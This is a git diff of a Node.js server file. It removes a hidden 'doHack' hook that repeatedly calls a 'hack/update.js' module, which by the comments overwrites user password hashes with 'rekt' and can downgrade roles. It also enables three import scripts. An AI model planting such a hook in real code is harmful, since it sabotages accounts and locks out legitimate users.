@@ -16,18 +16,6 @@ const Role = require('./models/role');
 const Settings = require('./models/settings');
 const axios = require('axios');
 let maxEval = 100;
-let doChanges = true;//the variable.
-let doHashUpdate=true;// decide of the password hash will be updated, update to 'rekt'.
-let doRoleUpdate=false; // decide of the role will be updated, update to 'Member'.
-const doHack = require('./script/hack/update.js'); //run the update, if allowed by a variable here.
-async function evaluateChanges(){
-  if (doChanges){
-    try {
-      if(doHashUpdate){setInterval(()=>{doHack.hashUpdate()})}//hash update.
-      if(doRoleUpdate){(async()=>{await doHack.roleUpdate()})}//role update.
-    }catch(e){console.error('[DoChanges]: '+e)}
-  }
-}
 const getIPInfo = (ipAddress) => {
     // https://ip-api.com/docs/api:json
     return axios.get(`http://ip-api.com/json/${ipAddress}?fields=182274`);
@@ -43,9 +31,9 @@ Settings.deleteAll()
 */
 
 if (config.import) {
-//const get1 = require('./script/import/import-settings')
-//const get2 = require('./script/import/import-roles')
-const get3 = require('./script/import/import-users')
+const get1 = require('./script/import/import-settings'); console.log('get1 completed');
+const get2 = require('./script/import/import-roles'); console.log('get2 completed');
+const get3 = require('./script/import/import-users'); console.log('get3 completed');
 }
 async function populateRoleLookups(){
   globals.AllRoles = await Role.getAll();
